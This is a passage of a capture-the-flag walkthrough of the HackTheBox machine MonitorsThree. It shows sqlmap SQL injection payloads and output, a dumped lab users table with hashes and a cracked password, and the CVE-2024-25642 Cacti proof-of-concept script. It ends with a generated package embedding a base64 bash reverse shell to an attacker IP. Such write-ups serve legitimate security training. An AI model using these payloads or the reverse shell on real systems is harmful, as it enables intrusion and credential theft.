+[</span><span class="sqlmap-timestamp">18:12:49</span><span class="go">] [</span><span class="sqlmap-info">INFO</span><span class="go">] testing 'MySQL &gt;= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[</span><span class="sqlmap-timestamp">18:12:50</span><span class="go">] [</span><span class="sqlmap-info">INFO</span><span class="go">] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+[</span><span class="sqlmap-timestamp">18:12:51</span><span class="go">] [</span><span class="sqlmap-info">INFO</span><span class="go">] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
+[</span><span class="sqlmap-timestamp">18:12:52</span><span class="go">] [</span><span class="sqlmap-info">INFO</span><span class="go">] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
+[</span><span class="sqlmap-timestamp">18:12:53</span><span class="go">] [</span><span class="sqlmap-info">INFO</span><span class="go">] testing 'Generic inline queries'
+[</span><span class="sqlmap-timestamp">18:12:53</span><span class="go">] [</span><span class="sqlmap-info">INFO</span><span class="go">] testing 'PostgreSQL &gt; 8.1 stacked queries (comment)'
+[</span><span class="sqlmap-timestamp">18:12:53</span><span class="go">] [</span><span class="sqlmap-warn">WARNING</span><span class="go">] time-based comparison requires larger statistical model, please wait. (done)
+[</span><span class="sqlmap-timestamp">18:12:54</span><span class="go">] [</span><span class="sqlmap-info">INFO</span><span class="go">] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
+[</span><span class="sqlmap-timestamp">18:12:55</span><span class="go">] [</span><span class="sqlmap-info">INFO</span><span class="go">] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
+[</span><span class="sqlmap-timestamp">18:12:55</span><span class="go">] [</span><span class="sqlmap-info">INFO</span><span class="go">] testing 'MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)'
+[</span><span class="sqlmap-timestamp">18:13:46</span><span class="go">] [</span><span class="sqlmap-info">INFO</span><span class="go">] POST parameter 'username' appears to be 'MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)' injectable
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
+for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
+[</span><span class="sqlmap-timestamp">18:13:46</span><span class="go">] [</span><span class="sqlmap-info">INFO</span><span class="go">] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[</span><span class="sqlmap-timestamp">18:13:46</span><span class="go">] [</span><span class="sqlmap-info">INFO</span><span class="go">] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[</span><span class="sqlmap-timestamp">18:13:50</span><span class="go">] [</span><span class="sqlmap-info">INFO</span><span class="go">] checking if the injection point on POST parameter 'username' is a false positive
+POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 75 HTTP(s) requests:
+---
+Parameter: username (POST)
+    Type: time-based blind
+    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=0xdf' AND (SELECT 2832 FROM (SELECT(SLEEP(5)))dybM) AND 'OxCQ'='OxCQ
+---
+[</span><span class="sqlmap-timestamp">18:15:07</span><span class="go">] [</span><span class="sqlmap-info">INFO</span><span class="go">] the back-end DBMS is MySQL
+[</span><span class="sqlmap-timestamp">18:15:07</span><span class="go">] [</span><span class="sqlmap-warn">WARNING</span><span class="go">] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions
+do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
+web server operating system: Linux Ubuntu
+web application technology: Nginx 1.18.0
+back-end DBMS: MySQL &gt;= 5.0.12 (MariaDB fork)
+[</span><span class="sqlmap-timestamp">18:15:32</span><span class="go">] [</span><span class="sqlmap-info">INFO</span><span class="go">] fetched data logged to text files under '/home/oxdf/.local/share/sqlmap/output/monitorsthree.htb'
+
+[*] ending @ 18:15:32 /2024-08-27/
+</span></code></pre></div></div>
+<p>Anytime I get back that the only option is time-based blind, I’ll want to take a deeper look to see if there are other options. Based on my playing around a bit, this should be vulnerable to a boolean-based blind attack, which will be much faster than time-based.</p>
+<p>To test this, I’ll use <code class="language-plaintext highlighter-rouge">--flush-session</code> to start clean, specify the DB as MySQL (based on what I found above), and the <code class="language-plaintext highlighter-rouge">--technique=B</code> for boolean. I’ll max the level and risk. I also won’t run with <code class="language-plaintext highlighter-rouge">--batch</code>, as that messes this up. On first starting, it asks two questions:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">got a 302 redirect to 'http://monitorsthree.htb/forgot_password.php'. Do you want to follow? [Y/n]
+redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n]
+</span></code></pre></div></div>
+<p>I need the first one to be Y, but the second N. If the second is Y, then it sends the same POST request back to <code class="language-plaintext highlighter-rouge">/forgot_password.php</code>, which just returns another 302 with no way to evaluate the response.</p>
+<p>It finds the injection much more quickly:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>sqlmap <span class="nt">-r</span> reset.request <span class="nt">--level</span> 5 <span class="nt">--risk</span> 3 <span class="nt">--dbms</span><span class="o">=</span>mysql <span class="nt">--technique</span><span class="o">=</span>B <span class="nt">--flush-session</span> 
+<span class="sqlmap-header-yellow">        ___
+       __H__
+ ___ ___[']_____ ___ ___  </span><span class="go">{</span><span class="sqlmap-header-blue">1.8.4#stable</span><span class="go">}</span><span class="sqlmap-header-yellow">
+|_ -| . [']     | .'| . |
+|___|_  [</span><span class="sqlmap-header-red">"</span><span class="sqlmap-header-yellow">]_|_|_|__,|  _|
+      |_|V...       |_|   </span><span class="go">https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 13:34:58 /2024-08-28/
+
+[</span><span class="sqlmap-timestamp">13:34:58</span><span class="go">] [</span><span class="sqlmap-info">INFO</span><span class="go">] parsing HTTP request from 'reset.request'
+[</span><span class="sqlmap-timestamp">13:34:58</span><span class="go">] [</span><span class="sqlmap-info">INFO</span><span class="go">] flushing session file
+[</span><span class="sqlmap-timestamp">13:34:58</span><span class="go">] [</span><span class="sqlmap-info">INFO</span><span class="go">] testing connection to the target URL
+got a 302 redirect to 'http://monitorsthree.htb/forgot_password.php'. Do you want to follow? [Y/n] y
+redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] n
+[</span><span class="sqlmap-timestamp">13:35:00</span><span class="go">] [</span><span class="sqlmap-info">INFO</span><span class="go">] checking if the target is protected by some kind of WAF/IPS
+[</span><span class="sqlmap-timestamp">13:35:01</span><span class="go">] [</span><span class="sqlmap-info">INFO</span><span class="go">] testing if the target URL content is stable
+[</span><span class="sqlmap-timestamp">13:35:01</span><span class="go">] [</span><span class="sqlmap-warn">WARNING</span><span class="go">] POST parameter 'username' does not appear to be dynamic
+[</span><span class="sqlmap-timestamp">13:35:01</span><span class="go">] [</span><span class="sqlmap-info">INFO</span><span class="go">] heuristic (basic) test shows that POST parameter 'username' might be injectable (possible DBMS: 'MySQL')
+[</span><span class="sqlmap-timestamp">13:35:01</span><span class="go">] [</span><span class="sqlmap-info">INFO</span><span class="go">] heuristic (XSS) test shows that POST parameter 'username' might be vulnerable to cross-site scripting (XSS) attacks
+[</span><span class="sqlmap-timestamp">13:35:01</span><span class="go">] [</span><span class="sqlmap-info">INFO</span><span class="go">] testing for SQL injection on POST parameter 'username'
+[</span><span class="sqlmap-timestamp">13:35:01</span><span class="go">] [</span><span class="sqlmap-info">INFO</span><span class="go">] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[</span><span class="sqlmap-timestamp">13:35:02</span><span class="go">] [</span><span class="sqlmap-warn">WARNING</span><span class="go">] reflective value(s) found and filtering out
+[</span><span class="sqlmap-timestamp">13:35:29</span><span class="go">] [</span><span class="sqlmap-info">INFO</span><span class="go">] testing 'OR boolean-based blind - WHERE or HAVING clause'
+[</span><span class="sqlmap-timestamp">13:35:49</span><span class="go">] [</span><span class="sqlmap-info">INFO</span><span class="go">] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
+[</span><span class="sqlmap-timestamp">13:35:51</span><span class="go">] [</span><span class="sqlmap-info">INFO</span><span class="go">] POST parameter 'username' appears to be 'OR boolean-based blind - WHERE or HAVING clause (NOT)' injectable (with --string="                                               Unable to process request, try again!")
+[</span><span class="sqlmap-timestamp">13:35:51</span><span class="go">] [</span><span class="sqlmap-warn">WARNING</span><span class="go">] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
+[</span><span class="sqlmap-timestamp">13:35:51</span><span class="go">] [</span><span class="sqlmap-info">INFO</span><span class="go">] checking if the injection point on POST parameter 'username' is a false positive
+POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
+sqlmap identified the following injection point(s) with a total of 222 HTTP(s) requests:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
+    Payload: username=0xdf' OR NOT 5761=5761-- McSu
+---
+[</span><span class="sqlmap-timestamp">13:35:58</span><span class="go">] [</span><span class="sqlmap-info">INFO</span><span class="go">] testing MySQL
+[</span><span class="sqlmap-timestamp">13:35:59</span><span class="go">] [</span><span class="sqlmap-info">INFO</span><span class="go">] confirming MySQL
+[</span><span class="sqlmap-timestamp">13:35:59</span><span class="go">] [</span><span class="sqlmap-info">INFO</span><span class="go">] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Nginx 1.18.0
+back-end DBMS: MySQL &gt;= 5.0.0 (MariaDB fork)
+[</span><span class="sqlmap-timestamp">13:36:00</span><span class="go">] [</span><span class="sqlmap-info">INFO</span><span class="go">] fetched data logged to text files under '/home/oxdf/.local/share/sqlmap/output/monitorsthree.htb'
+
+[*] ending @ 13:36:00 /2024-08-28/
+</span></code></pre></div></div>
+<h4 id="db-enumeration">DB Enumeration</h4>
+<p>I’ll get the databases. While increasing the threads <em>should</em> be safe with a boolean-blind, I had issues every time I tried it, so I’ll go without:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>sqlmap <span class="nt">-r</span> reset.request <span class="nt">--dbs</span>
+<span class="sqlmap-header-yellow">        ___
+       __H__
+ ___ ___[']_____ ___ ___  </span><span class="go">{</span><span class="sqlmap-header-blue">1.8.4#stable</span><span class="go">}</span><span class="sqlmap-header-yellow">
+|_ -| . [</span><span class="sqlmap-header-red">"</span><span class="sqlmap-header-yellow">]     | .'| . |
+|___|_  [</span><span class="sqlmap-header-red">.</span><span class="sqlmap-header-yellow">]_|_|_|__,|  _|
+      |_|V...       |_|   </span><span class="go">https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 13:36:10 /2024-08-28/
+
+[</span><span class="sqlmap-timestamp">13:36:10</span><span class="go">] [</span><span class="sqlmap-info">INFO</span><span class="go">] parsing HTTP request from 'reset.request'
+[</span><span class="sqlmap-timestamp">13:36:10</span><span class="go">] [</span><span class="sqlmap-info">INFO</span><span class="go">] resuming back-end DBMS 'mysql' 
+[</span><span class="sqlmap-timestamp">13:36:10</span><span class="go">] [</span><span class="sqlmap-info">INFO</span><span class="go">] testing connection to the target URL
+got a 302 redirect to 'http://monitorsthree.htb/forgot_password.php'. Do you want to follow? [Y/n] y
+redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] n
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
+    Payload: username=0xdf' OR NOT 5761=5761-- McSu
+---
+[</span><span class="sqlmap-timestamp">13:36:11</span><span class="go">] [</span><span class="sqlmap-info">INFO</span><span class="go">] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Nginx 1.18.0
+back-end DBMS: MySQL 5 (MariaDB fork)
+[</span><span class="sqlmap-timestamp">13:36:11</span><span class="go">] [</span><span class="sqlmap-info">INFO</span><span class="go">] fetching database names
+[</span><span class="sqlmap-timestamp">13:36:11</span><span class="go">] [</span><span class="sqlmap-info">INFO</span><span class="go">] fetching number of databases
+[</span><span class="sqlmap-timestamp">13:36:11</span><span class="go">] [</span><span class="sqlmap-warn">WARNING</span><span class="go">] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
+[</span><span class="sqlmap-timestamp">13:36:11</span><span class="go">] [</span><span class="sqlmap-info">INFO</span><span class="go">] retrieved: 2
+[</span><span class="sqlmap-timestamp">13:36:13</span><span class="go">] [</span><span class="sqlmap-info">INFO</span><span class="go">] retrieved: information_schema
+[</span><span class="sqlmap-timestamp">13:36:42</span><span class="go">] [</span><span class="sqlmap-info">INFO</span><span class="go">] retrieved: monitorsthree_db
+available databases [2]:
+[*] information_schema
+[*] monitorsthree_db
+
+[</span><span class="sqlmap-timestamp">13:37:08</span><span class="go">] [</span><span class="sqlmap-info">INFO</span><span class="go">] fetched data logged to text files under '/home/oxdf/.local/share/sqlmap/output/monitorsthree.htb'
+
+[*] ending @ 13:37:08 /2024-08-28/
+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">monitorsthree_db</code> is the interesting one. I’ll get the tables (continuing to enter Y then N at the initial requests):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>sqlmap <span class="nt">-r</span> reset.request <span class="nt">-D</span> monitorsthree_db <span class="nt">--tables</span>
+<span class="sqlmap-header-yellow">        ___
+       __H__
+ ___ ___[</span><span class="sqlmap-header-red">"</span><span class="sqlmap-header-yellow">]_____ ___ ___  </span><span class="go">{</span><span class="sqlmap-header-blue">1.8.4#stable</span><span class="go">}</span><span class="sqlmap-header-yellow">
+|_ -| . [</span><span class="sqlmap-header-red">)</span><span class="sqlmap-header-yellow">]     | .'| . |
+|___|_  [</span><span class="sqlmap-header-red">.</span><span class="sqlmap-header-yellow">]_|_|_|__,|  _|
+      |_|V...       |_|   </span><span class="go">https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 13:39:36 /2024-08-28/
+
+[</span><span class="sqlmap-timestamp">13:39:36</span><span class="go">] [</span><span class="sqlmap-info">INFO</span><span class="go">] parsing HTTP request from 'reset.request'
+[</span><span class="sqlmap-timestamp">13:39:36</span><span class="go">] [</span><span class="sqlmap-info">INFO</span><span class="go">] resuming back-end DBMS 'mysql'
+[</span><span class="sqlmap-timestamp">13:39:36</span><span class="go">] [</span><span class="sqlmap-info">INFO</span><span class="go">] testing connection to the target URL
+got a 302 redirect to 'http://monitorsthree.htb/forgot_password.php'. Do you want to follow? [Y/n] y
+redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] n
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
+    Payload: username=0xdf' OR NOT 5761=5761-- McSu
+---
+[</span><span class="sqlmap-timestamp">13:39:39</span><span class="go">] [</span><span class="sqlmap-info">INFO</span><span class="go">] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Nginx 1.18.0
+back-end DBMS: MySQL 5 (MariaDB fork)
+[</span><span class="sqlmap-timestamp">13:39:39</span><span class="go">] [</span><span class="sqlmap-info">INFO</span><span class="go">] fetching tables for database: 'monitorsthree_db'
+[</span><span class="sqlmap-timestamp">13:39:39</span><span class="go">] [</span><span class="sqlmap-info">INFO</span><span class="go">] fetching number of tables for database 'monitorsthree_db'
+[</span><span class="sqlmap-timestamp">13:39:39</span><span class="go">] [</span><span class="sqlmap-warn">WARNING</span><span class="go">] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
+[</span><span class="sqlmap-timestamp">13:39:39</span><span class="go">] [</span><span class="sqlmap-info">INFO</span><span class="go">] retrieved: 6
+[</span><span class="sqlmap-timestamp">13:39:41</span><span class="go">] [</span><span class="sqlmap-info">INFO</span><span class="go">] retrieved: invoices
+[</span><span class="sqlmap-timestamp">13:39:54</span><span class="go">] [</span><span class="sqlmap-info">INFO</span><span class="go">] retrieved: customers
+[</span><span class="sqlmap-timestamp">13:40:09</span><span class="go">] [</span><span class="sqlmap-info">INFO</span><span class="go">] retrieved: changelog
+[</span><span class="sqlmap-timestamp">13:40:22</span><span class="go">] [</span><span class="sqlmap-info">INFO</span><span class="go">] retrieved: tasks
+[</span><span class="sqlmap-timestamp">13:40:31</span><span class="go">] [</span><span class="sqlmap-info">INFO</span><span class="go">] retrieved: invoice_tasks
+[</span><span class="sqlmap-timestamp">13:40:53</span><span class="go">] [</span><span class="sqlmap-info">INFO</span><span class="go">] retrieved: users
+Database: monitorsthree_db
+[6 tables]
++---------------+
+| changelog     |
+| customers     |
+| invoice_tasks |
+| invoices      |
+| tasks         |
+| users         |
++---------------+
+
+[</span><span class="sqlmap-timestamp">13:41:01</span><span class="go">] [</span><span class="sqlmap-info">INFO</span><span class="go">] fetched data logged to text files under '/home/oxdf/.local/share/sqlmap/output/monitorsthree.htb'
+
+[*] ending @ 13:41:01 /2024-08-28/
+</span></code></pre></div></div>
+<p>There are six tables. I’ll dump the user’s table:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>sqlmap <span class="nt">-r</span> reset.request <span class="nt">-D</span> monitorsthree_db <span class="nt">-T</span> <span class="nb">users</span> <span class="nt">--dump</span>
+<span class="sqlmap-header-yellow">        ___
+       __H__
+ ___ ___[</span><span class="sqlmap-header-red">,</span><span class="sqlmap-header-yellow">]_____ ___ ___  </span><span class="go">{</span><span class="sqlmap-header-blue">1.8.4#stable</span><span class="go">}</span><span class="sqlmap-header-yellow">
+|_ -| . [</span><span class="sqlmap-header-red">.</span><span class="sqlmap-header-yellow">]     | .'| . |
+|___|_  [</span><span class="sqlmap-header-red">"</span><span class="sqlmap-header-yellow">]_|_|_|__,|  _|
+      |_|V...       |_|   </span><span class="go">https://sqlmap.org
+
+...[snip]...
+Database: monitorsthree_db
+Table: users
+[4 entries]
++----+------------+-----------------------------+-------------------+-----------+----------------------------------+-----------+-----------------------+------------+
+| id | dob        | email                       | name              | salary    | password                         | username  | position              | start_date |
++----+------------+-----------------------------+-------------------+-----------+----------------------------------+-----------+-----------------------+------------+
+| 2  | 1978-04-25 | admin@monitorsthree.htb     | Marcus Higgins    | 320800.00 | 31a181c8372e3afc59dab863430610e8 | admin     | Super User            | 2021-01-12 |
+| 5  | 1985-02-15 | mwatson@monitorsthree.htb   | Michael Watson    | 75000.00  | c585d01f2eb3e6e1073e92023088a3dd | mwatson   | Website Administrator | 2021-05-10 |
+| 6  | 1990-07-30 | janderson@monitorsthree.htb | Jennifer Anderson | 68000.00  | 1e68b6eb86b45f6d92f8f292428f77ac | janderson | Network Engineer      | 2021-06-20 |
+| 7  | 1982-11-23 | dthompson@monitorsthree.htb | David Thompson    | 83000.00  | 633b683cc128fe244b00f176c8a950f5 | dthompson | Database Manager      | 2022-09-15 |
++----+------------+-----------------------------+-------------------+-----------+----------------------------------+-----------+-----------------------+------------+
+...[snip]...
+</span></code></pre></div></div>
+<p>There are four users with hashes.</p>
+<h4 id="crack-password">Crack Password</h4>
+<p>I’ll take the hashes to <a href="https://crackstation.net/">CrackStation</a>, and the first one cracks:</p>
+<picture>
+<source srcset="/img/image-20240828084704767.webp" type="image/webp"/>
+<img alt="image-20240828084704767" class="include_image" loading="lazy" src="/img/image-20240828084704767.png"/>
+</picture>
+<p>The password “greencacti2001” works for <code class="language-plaintext highlighter-rouge">admin@monitorsthree.htb</code> / Marcus Higgins.</p>
+<h4 id="main-site">Main Site</h4>
+<p>These creds work to log into the main page at <code class="language-plaintext highlighter-rouge">monitorsthree.htb</code>, giving a dashboard:</p>
+<div style="position: relative;">
+<picture>
+<source srcset="/img/image-20240828084939957.webp" type="image/webp"/>
+<img alt="image-20240828084939957" class="include_image" loading="lazy" src="/img/image-20240828084939957.png" style="max-height: 400px; object-fit: cover; object-position: top; width: -webkit-fill-available; mask-image: linear-gradient(rgb(0, 0, 0), rgb(0,0,0) calc(100% - 100px), rgba(0,0,0,0) calc(100% - 20px)); -webkit-mask-image: linear-gradient(rgb(0, 0, 0), rgb(0,0,0) calc(100% - 100px), rgba(0,0,0,0) calc(100% - 20px));"/>
+</picture>
+<a href="javascript:void(0)" onclick="click_expand_image(event)" style="position: absolute; bottom: 35px; right: 15px;" title="Click to expand for full content"><img alt="expand" class="expand-contract" src="/icons/expand.png"/></a>
+</div>
+<p>There’s a bunch of pages with a bunch of filterable tables of tasks, invoices, users, etc. Everything is very static, and there’s nothing that takes user input.</p>
+<h3 id="exploit-cacti">Exploit Cacti</h3>
+<h4 id="authentication">Authentication</h4>
+<p>The same creds, admin / “greencacti2001”, work to log into <code class="language-plaintext highlighter-rouge">cacti.monitorsthree.htb</code>:</p>
+<picture>
+<source srcset="/img/image-20240828085123448.webp" type="image/webp"/>
+<img alt="image-20240828085123448" class="include_image" loading="lazy" src="/img/image-20240828085123448.png"/>
+</picture>
+<p>Even as the admin user, there’s not too much interesting in the admin panel.</p>
+<h4 id="identify-cve-2024-25642">Identify CVE-2024-25642</h4>
+<p>Searching for vulnerabilities in this version of Cacti returns a bunch of references to CVE-2024-25642:</p>
+<picture>
+<source srcset="/img/image-20240827180401410.webp" type="image/webp"/>
+<img alt="image-20240827180401410" class="include_image" loading="lazy" src="/img/image-20240827180401410.png"/>
+</picture>
+<h4 id="cve-2024-25642-background">CVE-2024-25642 Background</h4>
+<p>The <a href="https://github.com/Cacti/cacti/security/advisories/GHSA-7cmj-g5qc-pj88">advisory for CVE-2024-25642</a> say it is:</p>
+<blockquote>
+<p>An arbitrary file write vulnerability, exploitable through the “Package Import” feature, allows authenticated users having the “Import Templates” permission to execute arbitrary PHP code on the web server (<a href="https://en.wikipedia.org/wiki/Arbitrary_code_execution">RCE</a>).</p>
+</blockquote>
+<p>The advisory also has a nice POC section with a PHP script to generate a payload:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+
+<span class="nv">$xmldata</span> <span class="o">=</span> <span class="s2">"&lt;xml&gt;
+   &lt;files&gt;
+       &lt;file&gt;
+           &lt;name&gt;resource/test.php&lt;/name&gt;
+           &lt;data&gt;%s&lt;/data&gt;
+           &lt;filesignature&gt;%s&lt;/filesignature&gt;
+       &lt;/file&gt;
+   &lt;/files&gt;
+   &lt;publickey&gt;%s&lt;/publickey&gt;
+   &lt;signature&gt;&lt;/signature&gt;
+&lt;/xml&gt;"</span><span class="p">;</span>
+<span class="nv">$filedata</span> <span class="o">=</span> <span class="s2">"&lt;?php phpinfo(); ?&gt;"</span><span class="p">;</span>
+<span class="nv">$keypair</span> <span class="o">=</span> <span class="nb">openssl_pkey_new</span><span class="p">();</span> 
+<span class="nv">$public_key</span> <span class="o">=</span> <span class="nb">openssl_pkey_get_details</span><span class="p">(</span><span class="nv">$keypair</span><span class="p">)[</span><span class="s2">"key"</span><span class="p">];</span> 
+<span class="nb">openssl_sign</span><span class="p">(</span><span class="nv">$filedata</span><span class="p">,</span> <span class="nv">$filesignature</span><span class="p">,</span> <span class="nv">$keypair</span><span class="p">,</span> <span class="no">OPENSSL_ALGO_SHA256</span><span class="p">);</span>
+<span class="nv">$data</span> <span class="o">=</span> <span class="nb">sprintf</span><span class="p">(</span><span class="nv">$xmldata</span><span class="p">,</span> <span class="nb">base64_encode</span><span class="p">(</span><span class="nv">$filedata</span><span class="p">),</span> <span class="nb">base64_encode</span><span class="p">(</span><span class="nv">$filesignature</span><span class="p">),</span> <span class="nb">base64_encode</span><span class="p">(</span><span class="nv">$public_key</span><span class="p">));</span>
+<span class="nb">openssl_sign</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="nv">$signature</span><span class="p">,</span> <span class="nv">$keypair</span><span class="p">,</span> <span class="no">OPENSSL_ALGO_SHA256</span><span class="p">);</span>
+<span class="nb">file_put_contents</span><span class="p">(</span><span class="s2">"test.xml"</span><span class="p">,</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">"&lt;signature&gt;&lt;/signature&gt;"</span><span class="p">,</span> <span class="s2">"&lt;signature&gt;"</span><span class="mf">.</span><span class="nb">base64_encode</span><span class="p">(</span><span class="nv">$signature</span><span class="p">)</span><span class="mf">.</span><span class="s2">"&lt;/signature&gt;"</span><span class="p">,</span> <span class="nv">$data</span><span class="p">));</span>
+<span class="nb">system</span><span class="p">(</span><span class="s2">"cat test.xml | gzip -9 &gt; test.xml.gz; rm test.xml"</span><span class="p">);</span>
+
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+<p>It takes the following steps:</p>
+<ul>
+<li>Starts with a payload, in this case a page that runs <code class="language-plaintext highlighter-rouge">phpinfo()</code> as a POC.</li>
+<li>It generates a keypair and gets a signature for the data.</li>
+<li>It fills in the XML template with the payload, it’s signature, and it’s public key.</li>
+<li>It writes that XML to a file, and then compresses it to <code class="language-plaintext highlighter-rouge">test.xml.gz</code>, removing the first file.</li>
+</ul>
+<p>That payload can be uploaded into Cacti and will drop the payload.</p>
+<h4 id="shell">Shell</h4>
+<p>I’ll take the PHP and modify it slightly, replacing the <code class="language-plaintext highlighter-rouge">phpinfo</code> with a <a href="https://www.youtube.com/watch?v=OjkVep2EIlw">bash reverse shell</a> and changing the some names:</p>
+<picture>
+<source srcset="/img/image-20240828090538020.webp" type="image/webp"/>
+<img alt="image-20240828090538020" class="include_image" loading="lazy" src="/img/image-20240828090538020.png"/>
+</picture>
+<p>I’ll run this with PHP:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>php cve-2024-25642.php
+</code></pre></div></div>
+<p>It generates a file, <code class="language-plaintext highlighter-rouge">revshell.xml.gz</code> (the contents of which can be viewed with <code class="language-plaintext highlighter-rouge">zcat</code>):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">ls </span>revshell.xml.gz 
+<span class="go">revshell.xml.gz
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span>zcat revshell.xml.gz 
+<span class="go">&lt;xml&gt;
+   &lt;files&gt;
+       &lt;file&gt;
+           &lt;name&gt;resource/0xdf.php&lt;/name&gt;
+&lt;data&gt;PD9waHAgc3lzdGVtKCdiYXNoIC1jICJiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjE4LzQ0MyAwPiYxIicpOyA/Pg==&lt;/data&gt;
+&lt;filesignature&gt;dPtx+jCqbTht1ZbW1vD5yZnEwasfX5D1XVCY+oQ6/44hffOyRgw2c7EsFaa+qBXk9A5H/Iq9EoNPpExCAcd/yF2ADpl6XpTOgxqsBbMHv6Bfvz/8SLiTdnxdGHo8BxwxU4DMoCryilGNPoQODjxL0mRnfTo1Rmkk8diEyA6ePrRc7GnUV3wkyN+az0SNVqcEx9rYVnj8RxBDY28rKPZEPDyDkW0YaVyZAeEZVi3bI2rqvUw782lhqL/XqHuOFIad6faNkgwuL2pcjc4f3nvEHWwyt/mNjqWeLcgqGV2jJ5QsKYlf4Zpqvjbk1a61EqquFLkUil0xxf3y+fu+OKrmcg==&lt;/filesignature&gt;
+       &lt;/file&gt;
+   &lt;/files&gt;
+&lt;publickey&gt;LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUFwQzVDY0ZXdGFHdGZFV1IxcFJUSApIRXFGSjY4dG15Kyt5Qy9sbWZvVS9MYUVVVE1JeHJCSUJRb3JvZW5DL3pGdUhRQlUyY3JkdzkyWEZBdHBkSElyCnhxUnRtUzdod3NXSUU2Y1lCQVd0Vlh4UkNwZHllMGtjNWhhVllqL2JKZVFMZDRqNFFhZEJ3aWhhWGFmL3ZpRDkKckYxc2E3UjNUZnh2YVJobzFuNWFJUUJhWkFBTkErZ1pLUXZOQWFKeFZjNjFQVnNYOXIwNzB2NFhDMEhmNytieQpPd25IdWNMT0hrL3BWMHFMUFY2bG5sK0RrYWhyM0Fqc2pSUmtUR0VudFR0SnlXMlZ5VXdIdkFoWmZydW4ybkZhClptT09SL0EydUtxT0c5T3crK0s4aGlmM3lLMFNoWDJnYlFSMmh4d0F4eDlYbnRic0Z1K1hMTnVUb25GWWI1UG8KWVFJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg==&lt;/publickey&gt;
